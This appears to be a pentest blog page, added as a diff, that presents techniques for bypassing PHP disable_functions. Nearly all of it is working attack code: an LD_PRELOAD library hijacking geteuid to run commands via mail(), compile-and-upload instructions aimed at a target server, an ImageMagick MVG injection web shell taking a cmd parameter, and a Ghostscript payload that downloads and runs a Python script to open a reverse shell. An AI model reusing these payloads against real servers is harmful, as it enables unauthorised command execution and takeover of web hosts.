@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+        <meta charset="utf-8" />
+        <title>bypass disable functions</title>
+        <link rel="stylesheet" href="/theme/css/main.css" />
+</head>
+
+<body id="index" class="home">
+        <header id="banner" class="body">
+                <h1><a href="/">Follow Your Heart </a></h1>
+                <nav><ul>
+                    <li><a href="/category/pentest.html">Pentest</a></li>
+                    <li><a href="/category/learning.html">Learning</a></li>
+                    <li><a href="/category/python.html">Python</a></li>
+                    <li><a href="/pages/tips.html">Tips</a></li>
+                    <li><a href="/pages/bash.html">Bash</a></li>
+                    <li><a href="/pages/question.html">Question</a></li>
+                    <li><a href="/pages/reverse-shell.html">各种姿势的反弹shell</a></li>
+                </ul></nav>
+        </header><!-- /#banner -->
+<section id="content" class="body">
+  <article>
+    <header>
+      <h1 class="entry-title">
+        <a href="/bypass-disabled-functions.html" rel="bookmark"
+           title="Permalink to bypass disable functions">bypass disable functions</a></h1>
+    </header>
+<footer class="post-info">
+        <span class="published" title="2017-12-12T00:00:00+01:00">
+                <a href='#'>12/12/2017 </a>
+                <a href="/category/pentest.html">Pentest</a>
+        </span>
+
+
+
+</footer><!-- /.post-info -->
+    <div class="entry-content">
+      
+      <p><a href="https://threathunter.org/topic/596d90d5dff9e14c40b61986">https://threathunter.org/topic/596d90d5dff9e14c40b61986</a></p>
+<div class="highlight"><pre><span></span>#<span class="k">include</span> <span class="o">&lt;</span><span class="nv">stdlib</span>.<span class="nv">h</span><span class="o">&gt;</span>
+#<span class="k">include</span> <span class="o">&lt;</span><span class="nv">stdio</span>.<span class="nv">h</span><span class="o">&gt;</span>
+#<span class="k">include</span> <span class="o">&lt;</span><span class="nv">string</span>.<span class="nv">h</span><span class="o">&gt;</span>
+<span class="nv">void</span> <span class="nv">payload</span><span class="ss">()</span> {
+<span class="nv">system</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">echo aaaaa&gt; /tmp/abc.txt</span><span class="s2">&quot;</span><span class="ss">)</span><span class="c1">;</span>
+}
+<span class="nv">int</span> <span class="nv">geteuid</span><span class="ss">()</span> {
+<span class="k">if</span> <span class="ss">(</span><span class="k">getenv</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">LD_PRELOAD</span><span class="s2">&quot;</span><span class="ss">)</span> <span class="o">==</span> <span class="nv">NULL</span><span class="ss">)</span> { <span class="k">return</span> <span class="mi">0</span><span class="c1">; } </span>
+<span class="nv">unsetenv</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">LD_PRELOAD</span><span class="s2">&quot;</span><span class="ss">)</span><span class="c1">;</span>
+<span class="nv">payload</span><span class="ss">()</span><span class="c1">;</span>
+}
+</pre></div>
+
+
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span> 
+<span class="nb">putenv</span><span class="p">(</span><span class="s2">&quot;LD_PRELOAD=/var/www/hack.so&quot;</span><span class="p">);</span>
+<span class="nb">mail</span><span class="p">(</span><span class="s2">&quot;a[@localhost](/user/localhost)&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</pre></div>
+
+
+<p>使用方法：</p>
+<div class="highlight"><pre><span></span><span class="n">gcc</span> <span class="o">-</span><span class="k">c</span> <span class="o">-</span><span class="n">fPIC</span> <span class="n">hack</span><span class="p">.</span><span class="k">c</span> <span class="o">-</span><span class="n">o</span> <span class="n">hack</span>
+<span class="n">gcc</span> <span class="o">-</span><span class="n">shared</span> <span class="n">hack</span> <span class="o">-</span><span class="n">o</span> <span class="n">hack</span><span class="p">.</span><span class="n">so</span>
+</pre></div>
+
+
+<p>修改hack.c文件里面的内容即可执行命令，经过测试在lnmp一键安装包可以顺利执行。
+在gcc编译的时候可以放在其他linux上面编译，好了之后上传到目标服务器。</p>
+<p>====
+2018.8.22:</p>
+<p>使用imageMagick 绕过:</p>
+<div class="highlight"><pre><span></span><span class="o">&lt;</span>?<span class="nv">php</span>
+<span class="nv">echo</span> <span class="s2">&quot;</span><span class="s">Disable Functions: </span><span class="s2">&quot;</span> . <span class="nv">ini_get</span><span class="ss">(</span><span class="s1">&#39;</span><span class="s">disable_functions</span><span class="s1">&#39;</span><span class="ss">)</span> . <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="c1">;</span>
+
+<span class="mh">$c</span><span class="nv">ommand</span> <span class="o">=</span> <span class="nv">PHP_SAPI</span> <span class="o">==</span> <span class="s1">&#39;</span><span class="s">cli</span><span class="s1">&#39;</span> ? <span class="mh">$a</span><span class="nv">rgv</span>[<span class="mi">1</span>] : $<span class="nv">_GET</span>[<span class="s1">&#39;</span><span class="s">cmd</span><span class="s1">&#39;</span>]<span class="c1">;</span>
+<span class="k">if</span> <span class="ss">(</span><span class="mh">$c</span><span class="nv">ommand</span> <span class="o">==</span> <span class="s1">&#39;&#39;</span><span class="ss">)</span> {
+    <span class="mh">$c</span><span class="nv">ommand</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="s">id</span><span class="s1">&#39;</span><span class="c1">;</span>
+}
+
+<span class="mh">$e</span><span class="nv">xploit</span> <span class="o">=</span> <span class="o">&lt;&lt;&lt;</span><span class="nv">EOF</span>
+<span class="nv">push</span> <span class="nv">graphic</span><span class="o">-</span><span class="nv">context</span>
+<span class="nv">viewbox</span> <span class="mi">0</span> <span class="mi">0</span> <span class="mi">640</span> <span class="mi">480</span>
+<span class="nv">fill</span> <span class="s1">&#39;</span><span class="s">url(https://example.com/image.jpg&quot;|$command&quot;)</span><span class="s1">&#39;</span>
+<span class="nv">pop</span> <span class="nv">graphic</span><span class="o">-</span><span class="nv">context</span>
+<span class="nv">EOF</span><span class="c1">;</span>
+
+<span class="nv">file_put_contents</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">KKKK.mvg</span><span class="s2">&quot;</span>, <span class="mh">$e</span><span class="nv">xploit</span><span class="ss">)</span><span class="c1">;</span>
+$<span class="nv">thumb</span> <span class="o">=</span> <span class="nv">new</span> <span class="nv">Imagick</span><span class="ss">()</span><span class="c1">;</span>
+$<span class="nv">thumb</span><span class="o">-&gt;</span><span class="nv">readImage</span><span class="ss">(</span><span class="s1">&#39;</span><span class="s">KKKK.mvg</span><span class="s1">&#39;</span><span class="ss">)</span><span class="c1">;</span>
+$<span class="nv">thumb</span><span class="o">-&gt;</span><span class="nv">writeImage</span><span class="ss">(</span><span class="s1">&#39;</span><span class="s">KKKK.png</span><span class="s1">&#39;</span><span class="ss">)</span><span class="c1">;</span>
+$<span class="nv">thumb</span><span class="o">-&gt;</span><span class="nv">clear</span><span class="ss">()</span><span class="c1">;</span>
+$<span class="nv">thumb</span><span class="o">-&gt;</span><span class="nv">destroy</span><span class="ss">()</span><span class="c1">;</span>
+<span class="k">unlink</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">KKKK.mvg</span><span class="s2">&quot;</span><span class="ss">)</span><span class="c1">;</span>
+<span class="k">unlink</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">KKKK.png</span><span class="s2">&quot;</span><span class="ss">)</span><span class="c1">;</span>
+?<span class="o">&gt;</span>
+</pre></div>
+
+
+<p>上面的比较老，最新的imagemagic漏洞:</p>
+<p>http://seclists.org/oss-sec/2018/q3/142</p>
+<div class="highlight"><pre><span></span><span class="o">%!</span><span class="nv">PS</span>
+<span class="nv">userdict</span> <span class="o">/</span><span class="nv">setpagedevice</span> <span class="nv">undef</span>
+<span class="nv">save</span>
+<span class="nv">legal</span>
+{ <span class="nv">null</span> <span class="nv">restore</span> } <span class="nv">stopped</span> { <span class="nv">pop</span> } <span class="k">if</span>
+{ <span class="nv">legal</span> } <span class="nv">stopped</span> { <span class="nv">pop</span> } <span class="k">if</span>
+<span class="nv">restore</span>
+<span class="nv">mark</span> <span class="o">/</span><span class="nv">OutputFile</span> <span class="ss">(</span><span class="o">%</span><span class="nv">pipe</span><span class="o">%</span><span class="nv">wget</span> <span class="mi">127</span>.<span class="mi">0</span>.<span class="mi">0</span>.<span class="mi">1</span>:<span class="mi">8000</span><span class="o">/</span><span class="nv">re</span>.<span class="nv">py</span> <span class="o">&amp;&amp;</span> <span class="nv">python</span> <span class="nv">re</span>.<span class="nv">py</span> <span class="mi">127</span>.<span class="mi">0</span>.<span class="mi">0</span>.<span class="mi">1</span> <span class="mi">8081</span><span class="ss">)</span> <span class="nv">currentdevice</span> <span class="nv">putdeviceprops</span>
+</pre></div>
+    </div><!-- /.entry-content -->
+
+  </article>
+</section>
+        <section id="extras" class="body">
+        </section><!-- /#extras -->
+
+
+</body>
+</html>
